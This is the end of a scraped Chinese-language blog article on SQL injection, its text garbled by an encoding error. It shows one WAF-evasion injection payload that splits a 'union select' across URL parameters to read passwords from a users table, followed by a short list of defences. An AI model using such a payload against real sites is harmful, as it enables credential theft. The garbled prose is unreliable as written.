class=pgc-end-literature>ä¸¾ä¾‹ï¼š</p><pre>/?a=1+union/*&amp;b=*/select+1,pass/*&amp;c=*/from+users--select * from table where a=1 union/* and b=*/select 1,pass/* limit */from usersâ€”</pre><h1 class=pgc-h-arrow-right>SQLæ³¨å…¥é˜²å¾¡</h1><p>1.å¯¹ç”¨æˆ·è¾“å…¥çš„å†…å®¹è¿›è¡Œè½¬ä¹‰ï¼›</p><p>2.é™åˆ¶å…³é”®å­—çš„è¾“å…¥ï¼Œå¦‚å•å¼•å·ã€åŒå¼•å·ã€å³æ‹¬å·ç­‰ï¼Œé™åˆ¶è¾“å…¥çš„é•¿åº¦ï¼›</p><p>3.ä½¿ç”¨SQLè¯­å¥é¢„å¤„ç†ï¼Œå¯¹SQLè¯­å¥è¿›è¡Œé¢„ç¼–è¯‘ï¼Œç„¶åè¿›è¡Œå‚æ•°ç»‘å®šï¼Œæœ€åä¼ å…¥å‚æ•°ï¼›</p><p>4.æ·»åŠ WAFï¼Œé˜²ç«å¢™ç­‰ã€‚</p></div><div class="post-meta meta-tags"><ul class=clearfix><li><a>'SQL','æ€»ç»“','æœ€å…¨'</a></li></ul></div></article></div></div><div id=secondary><section class=widget><form id=search action=//www.google.com/search method=get accept-charset=utf-8 target=_blank _lpchecked=1><input type=text name=q maxlength=20 placeholder=æœç´¢>
<input type=hidden name=sitesearch value=geekbank.cf>
<button type=submit>ğŸ”</button></form></section><section class=widget><h3 class=widget-title>æœ€æ–°æ–‡ç«  âš¡</h3><ul class=widget-list></ul></section><section class=widget><h3 class=widget-title>å…¶ä»–</h3><ul class=widget-list><li><a href=TOS.html>ä½¿ç”¨æ¢æ¬¾</a></li><li><a href=CommentPolicy.html>ç•™è¨€æ”¿ç­–</a></li><li><a href=mailto:gdnews@tuta.io rel=nofollow>DMCA</a></li><li><a href=mailto:gdnews@tuta.io rel=nofollow>è¯çµ¡æˆ‘å€‘</a></li></ul></section></div></div></div></div><footer id=footer><div class=container>&copy; 2020 <a href>æå®¢å¿«è¨Š</a></div></footer><script type=text/javascript>window.MathJax={tex2jax:{inlineMath:[['$','$']],processEscapes:true}};</script><script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script><a id=rocket href=#top></a><script type=text/javascript src=https://kknews.cf/js/totop.js async></script><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','UA-146415161-2','auto');ga('send','pageview');}</script><script async src=https://www.google-analytics.com/analytics.js></script><script type=text/javascript src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5e508ed9e4e698bb"></script></body></html>